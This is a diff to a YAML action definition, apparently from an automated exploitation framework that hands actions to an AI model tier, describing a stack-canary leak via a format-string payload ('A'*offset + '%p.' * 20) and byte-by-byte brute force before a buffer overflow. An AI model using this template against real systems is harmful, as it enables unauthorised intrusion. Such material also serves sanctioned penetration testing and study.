@@ -2,15 +2,19 @@ name: canary_leak
 category: binary
 description: Stack canary leak exploitation
 preconditions:
-  - has_target
+- has_target
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 -c "print('A'*offset + '%p.' * 20)""
-parser: null
+command_template: 'python3 -c "print(''A''*offset + ''%p.'' * 20)"
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Leak canary via format string (%p) or byte-by-byte brute force (fork server). Once known, include canary in overflow payload before return address."
+mechanism: Leak canary via format string (%p) or byte-by-byte brute force (fork server).
+  Once known, include canary in overflow payload before return address.
+hacktricks_ref: binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/bf-forked-stack-canaries.md
